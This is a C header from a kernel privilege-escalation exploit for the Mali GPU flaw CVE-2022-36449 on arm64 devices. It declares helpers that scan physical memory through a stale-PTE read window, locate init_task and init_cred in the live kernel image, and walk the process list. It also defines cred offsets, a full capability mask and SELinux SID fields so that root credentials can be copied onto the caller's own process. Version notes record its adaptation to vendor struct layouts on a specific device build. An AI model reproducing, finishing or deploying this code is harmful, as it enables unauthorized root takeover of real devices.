/* Escalation scanner over the physical-read window backend (task 3 of the
 * 36449 escalation).  Host-testable pure C99: all kernel memory arrives
 * through a read callback, so the same code runs on synthetic memory in
 * unit tests and on the device behind the stale-PTE window reader.
 *
 * Model (see MALI-4.9.113-OFFSETS.md and MALI-36449-RECLAIM.md):
 *  - the kernel image is loaded at PA 0x1080000 and IS the live .data:
 *    reading it at runtime returns current values, not boot-time ones;
 *  - init_task (the only task_struct inside the image) is found by its
 *    comm "swapper/" plus pid==tgid==0, mm==NULL and two plausible
 *    linear-map list pointers (the tasks list is populated at runtime,
 *    so tasks.next is NOT a self-pointer on a booted system);
 *  - init_task.cred points at init_cred, also inside the image: its
 *    runtime uid/caps/security give the exact privileged values to copy,
 *    no assumptions about CAP_LAST_CAP or the kernel SID;
 *  - every other task_struct lives in the linear map
 *    (VA = ESC_LINEAR_BASE + PA, RAM assumed to start at PA 0 - the
 *    first hop is validated before it is trusted).
 */
#ifndef ESC_SCAN_H
#define ESC_SCAN_H

#include <stddef.h>
#include <stdint.h>

#define ESC_PAGE 4096u

/* Linear map: ARM64_VA_BITS=39, RAM 2 GB from PA 0 (validated at the
 * first tasks hop; a mismatch aborts the walk). */
#define ESC_LINEAR_BASE 0xffffffc000000000ULL
#define ESC_RAM_SIZE    0x80000000ULL

/* Image mapping: VA = image_va_base + PA.  Default per KIMAGE_VADDR +
 * boot.img kernel_addr (panic log: base ffffff8009080000 = KIMAGE_VADDR
 * + 0x1080000).  Confirmed at runtime from init_task.cred pointing
 * back into the image range. */
#define ESC_IMAGE_BASE_DEFAULT 0xffffff8008000000ULL
#define ESC_IMAGE_PA_DEFAULT   0x1080000ULL
#define ESC_IMAGE_SIZE_DEFAULT 0x8d5800ULL /* boot.img 5000000896 */

/* cred offsets (struct size 0xa8) */
#define ESC_C_USAGE  0x00u
#define ESC_C_UID    0x04u
#define ESC_C_GID    0x08u
#define ESC_C_SUID   0x0cu
#define ESC_C_SGID   0x10u
#define ESC_C_EUID   0x14u
#define ESC_C_EGID   0x18u
#define ESC_C_FSUID  0x1cu
#define ESC_C_FSGID  0x20u
#define ESC_C_SECUREBITS 0x24u
#define ESC_C_CAP_PERMITTED 0x30u
#define ESC_C_CAP_EFFECTIVE 0x38u
#define ESC_C_CAP_BSET 0x40u
#define ESC_C_CAP_AMBIENT 0x48u
#define ESC_C_SECURITY 0x78u

/* task_security_struct: osid 0x00, sid 0x04 */
#define ESC_TSS_SID   0x04u

/* Full capability set for 4.9: CAP_LAST_CAP = CAP_AUDIT_READ = 37, so
 * bits 0..37 = 0x3fffffffff.  Used for the write phase only as a
 * fallback; the primary source is init_cred observed at runtime. */
#define ESC_CAPS_FULL_4_9 0x3fffffffffULL

/* Read len bytes of physical memory at pa into buf.  Returns 0 on
 * success, nonzero on failure.  Each call stays within ONE 4K page
 * (esc_scan never issues a cross-page read); pa may be unaligned. */
typedef int (*esc_read_fn)(uint64_t pa, void *buf, size_t len);

struct esc_credview {
	uint32_t usage;
	uint32_t uid, gid, suid, sgid, euid, egid, fsuid, fsgid;
	uint32_t securebits;
	uint64_t cap_permitted, cap_effective, cap_bset, cap_ambient;
	uint64_t security;
	uint32_t uid_off;   /* offset of uid within the struct (4 + shift);
			       v6: vendor layouts may shift cred too */
};

/* ---- VA/PA helpers ---- */

int esc_is_linear_va(uint64_t va);           /* inside linear RAM map */
uint64_t esc_linear_pa(uint64_t va);         /* va - ESC_LINEAR_BASE */
int esc_is_image_va(uint64_t va, uint64_t image_va_base);
uint64_t esc_image_pa(uint64_t va, uint64_t image_va_base);

/* Live image PA extent for pointer plausibility checks.  v4 proved the
 * running 0921 image is 26.4 MB while *_DEFAULT still says 0x8d5800:
 * cred pointers into the upper image were wrongly rejected.  Defaults
 * cover synthetic tests until the probe sets the real range. */
void esc_set_image_range(uint64_t base_pa, uint64_t size);
int esc_image_range_contains(uint64_t pa);

/* ---- image scan helpers ---- */

/* arm64 Image header: u32 @0x38 == 0x644d5241 ("ARM\x64"). */
int esc_image_magic_ok(const uint8_t *page);

/* Header fields of the FIRST image page: text_offset @0x08 and
 * image_size @0x10 (memory footprint through bss - the correct scan
 * range for the RUNNING build, whatever boot.img said).
 * _raw never validates; the validated wrapper only rejects obviously
 * broken values.  v3 showed the 0921 header carries text_offset equal
 * to the LOAD ADDRESS (0x1080000, vendor semantics) and
 * image_size=0x193a000 (26.4 MB), so bounds must be generous. */
#define ESC_IMAGE_SIZE_MAX 0x2200000ULL /* 36 MB scan cap */
void esc_image_header_raw(const uint8_t *page, uint64_t *text_off,
			  uint64_t *image_size);
int esc_image_header(const uint8_t *page, uint64_t *text_off,
		     uint64_t *image_size);

/* Find "swapper" at ANY byte offset inside a 4K image page (v1 scanned
 * 8-aligned only and found zero candidates on 0921).  _at starts at
 * byte `from` so callers can enumerate several hits per page.
 * Return 1 and store the offset; 0 if absent. */
int esc_page_find_swapper_at(const uint8_t *page, uint32_t from,
			     uint32_t *off);

/* ---- v2 candidate prober (offset-shift tolerant diagnostics) ----
 *
 * raw is a window AROUND a "swapper" hit; hit is the hit's offset in
 * raw (raw covers [hit-0x400 .. hit+16) on the device).  Besides the
 * rebuild-relative checks the prober LOCATES the structural pairs by
 * content, so a vendor task_struct shift shows up as reported offsets
 * instead of a bare "not found". */
#define ESC_CAND_RAW_SPAN 0x420u
#define ESC_CAND_HIT_OFF  0x400u

struct esc_cand {
	/* located by content: adjacent linear VAs (tasks list_head) */
	int has_tasks_pair;
	uint32_t tasks_pair_off;
	/* rebuild-relative (hit == comm): all must hold for a match */
	int rel_tasks_linear;     /* pair exactly at hit-0x2b0 */
	int rel_mm_zero;          /* u64 at hit-0x260 == 0 */
	int rel_pid_tgid_zero;    /* u32s at hit-0x1b0/-0x1ac == 0 */
	int rel_cred_pair;        /* equal image VAs at hit-0x10/-0x8 */
};

void esc_probe_candidate(const uint8_t *raw, uint32_t hit, uint32_t raw_len,
			 struct esc_cand *out);

/* ---- offset-free task window analyzer (v5) ----
 *
 * Vendor task_struct layouts shift fields (v4: tasks pair 0x188 below
 * comm instead of the rebuild 0x2b0).  Instead of fixed offsets the
 * walk reads a window AROUND each tasks list_head and derives every
 * needed field by content: the comm string, the pid==tgid==wanted int32
 * pair, and the adjacent EQUAL linear VAs (real_cred/cred of a runtime
 * task; both point into the slab, unlike init_task's image-VA pair). */
#define ESC_TASKWIN_HALF 0x480u
#define ESC_TASKWIN_SPAN (2u * ESC_TASKWIN_HALF)
#define ESC_TASKWIN_TASKS_OFF ESC_TASKWIN_HALF

struct esc_taskwin {
	uint64_t tasks_next;
	int has_comm;
	uint32_t comm_off;          /* window offset of comm[0] */
	int has_pid_tgid;
	uint32_t pid_off;
};

/* win covers [tasks_pa - ESC_TASKWIN_HALF, +same); want_comm/want_pid
 * identify THIS process (comm unique via prctl). */
void esc_analyze_taskwin(const uint8_t *win, uint32_t win_len,
			 const char *want_comm, int32_t want_pid,
			 struct esc_taskwin *out);

/* Hard cap for walking the circular tasks list (see walk_tasks_v2 in
 * cve_2022_36449_escalate.c). */
#define ESC_MAX_TASKS 1024

/* Shift-tolerant cred check (v6): reads 0xa8 bytes, locates the run of
 * eight consecutive u32s equal to expect_id (uid..fsgid) anywhere at
 * 4-aligned offsets 0x04..0x30, derives the whole-field shift from it
 * and validates the rest relative to that shift.  Fills c->uid_off.
 * Returns 0 on success, negative on failure (reason set). */
int esc_check_cred_shifted(esc_read_fn rd, uint64_t cred_pa, int kind,
			   uint32_t expect_id, struct esc_credview *c,
			   uint64_t *tss_pa, uint32_t *osid,
			   uint32_t *sid, const char **reason);

#endif
